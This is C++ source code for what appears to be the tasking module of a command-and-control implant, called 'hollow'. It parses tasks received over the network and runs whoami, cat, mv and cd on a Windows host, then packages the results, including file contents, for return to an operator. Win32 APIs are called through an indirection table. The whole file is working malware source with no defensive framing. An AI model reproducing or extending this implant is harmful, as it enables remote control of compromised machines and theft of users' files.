#include "../../includes/core/core.h"
#include "../../includes/net/net.h"
#include "../../includes/byte/byte.h"
#include "../../includes/core/tasker.h"
#include "../../includes/utils/utils.h"


BOOL Dispatch() {
	packager->NewParser(g_NetMgr->RecvBuf(), g_NetMgr->RecvSize());
	INT32 TotalTasks = packager->Parse4();
	if (TotalTasks <= 0) {
		DEBUG_LOGA("[!] No Task");
		return TRUE;
	}
	packager->Pack4(MSG_OUTPUT);
	packager->Pack4(hollow->config->AgentID);
	packager->Pack4(TotalTasks);
	for (INT i = 0; i < TotalTasks; i++) {
		INT32 Code = packager->Parse4();
		switch (Code)
		{
		case TASK_WHOAMI:
			DEBUG_LOGA("[*] Running whoami");
			do_whoami();
			break;
		case TASK_CAT:
			DEBUG_LOGA("[*] Running cat");
			do_cat();
			break;
		case TASK_MV:
			DEBUG_LOGA("[*] Running mv");
			do_mv();
			break;
		case TASK_CD:
			DEBUG_LOGA("[*] Running cd");
			do_cd();
			break;
		default:
			break;
		}

	}
	return TRUE;

}


void do_cd() {
	INT32 TaskID = packager->Parse4();
	packager->Pack4(TaskID);

	INT32 dirLen = packager->Parse4();
	PBYTE dir = (PBYTE)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, dirLen);
	packager->ParseBytes(dir, dirLen);

	if(!hollow->Win32.SetCurrentDirectoryA((PCHAR)dir)) {
		packager->Pack4(TASK_FAILED);
		packager->Pack4((INT32)utils::win::GetTeb()->LastErrorValue);
		hollow->Win32.LocalFree(dir);
		return;
	}

	DWORD size = hollow->Win32.GetCurrentDirectoryA(0, NULL);
	PBYTE pwd = (PBYTE)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, size);

	DWORD res = hollow->Win32.GetCurrentDirectoryA(size, (PCHAR)pwd);
	if(res == 0 | res >= size) {
		packager->Pack4(TASK_FAILED);
		packager->Pack4((INT32)utils::win::GetTeb()->LastErrorValue);
		hollow->Win32.LocalFree(dir);
		hollow->Win32.LocalFree(pwd);
		return;
	}

	packager->Pack4(OUTPUT_RAW);
	packager->Pack4((INT32)res);
	packager->PackBytes(pwd, (INT32)res);
	if (pwd) { hollow->Win32.LocalFree(pwd); }
	if (dir) { hollow->Win32.LocalFree(dir); }
	return;

}

void do_whoami() {
	INT32 TaskID = packager->Parse4();
	packager->Pack4(TaskID);

	DWORD BufSize = 0;


	hollow->Win32.GetUserNameA(NULL, &BufSize);
	if (!BufSize) {
		packager->Pack4(TASK_FAILED);
		packager->Pack4((INT32)utils::win::GetTeb()->LastErrorValue);
		return;
	}

	PBYTE buf = (PBYTE)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, BufSize);
	if (!buf) {
		packager->Pack4(TASK_FAILED);
		packager->Pack4((INT32)utils::win::GetTeb()->LastErrorValue);
		return;
	}


	if (!hollow->Win32.GetUserNameA((PCHAR)buf, &BufSize)) {
		packager->Pack4(TASK_FAILED);
		packager->Pack4((INT32)utils::win::GetTeb()->LastErrorValue);
		hollow->Win32.LocalFree(buf);
		return;
	}
	
	packager->Pack4(OUTPUT_NEEDS_PARSE);
	packager->Pack4(PARSE_WHOAMI);
	packager->Pack4(BufSize);
	packager->PackBytes(buf, BufSize);
	if (buf) { hollow->Win32.LocalFree(buf); }
	return;
}


void do_mv() {
	INT32 TaskID = packager->Parse4();
	packager->Pack4(TaskID);

	INT32 srclen = packager->Parse4();
	PBYTE src = (PBYTE)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, srclen);
	packager->ParseBytes(src, srclen);
	INT32 dstLen = packager->Parse4();
	PBYTE dst = (PBYTE)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, dstLen);
	packager->ParseBytes(dst, dstLen);

	if (!hollow->Win32.MoveFileA((LPCSTR)src, (LPCSTR)dst)) {
		packager->Pack4(TASK_FAILED);
		packager->Pack4((INT32)utils::win::GetTeb()->LastErrorValue);
		hollow->Win32.LocalFree(src);
		hollow->Win32.LocalFree(dst);
		return;
	}
	packager->Pack4(MV_SUCCESS);
	if (src) { hollow->Win32.LocalFree(src); }
	if (dst) { hollow->Win32.LocalFree(dst); }
	return;
}


void do_cat() {
	BOOL result     = FALSE;
	HANDLE hFile   = NULL;
	//PBYTE buf       = NULL;
	DWORD ChunkSize = 2048;
	DWORD BytesRead = 0;

	INT32 TaskID = packager->Parse4();
	packager->Pack4(TaskID);

	INT32 strlen = packager->Parse4();
	PBYTE file = (PBYTE)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, strlen);
	packager->ParseBytes(file, strlen);

	hFile = hollow->Win32.CreateFileA((PCHAR)file, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hFile || hFile == INVALID_HANDLE_VALUE) {
		DEBUG_LOGA("[!] Failed Opening File");
		packager->Pack4(TASK_FAILED);
		packager->Pack4((INT32)utils::win::GetTeb()->LastErrorValue);
		hollow->Win32.LocalFree(file);
		return;
	}

	CHAR buf[2048];
	result = hollow->Win32.ReadFile(hFile, buf, ChunkSize, &BytesRead, NULL);
	if (!result) {
		DEBUG_LOGA("[!] Failed Reading Files");
		packager->Pack4(TASK_FAILED);
		packager->Pack4((INT32)utils::win::GetTeb()->LastErrorValue);
		hollow->Win32.LocalFree(file);
		hollow->Win32.CloseHandle(hFile);
		return;
	}

	packager->Pack4(OUTPUT_RAW);
	packager->Pack4((INT32)BytesRead);
	packager->PackBytes((PBYTE)buf, (INT32)BytesRead);

	if (file) { hollow->Win32.LocalFree(file); }
	if (hFile) { hollow->Win32.CloseHandle(hFile); }
	return;
}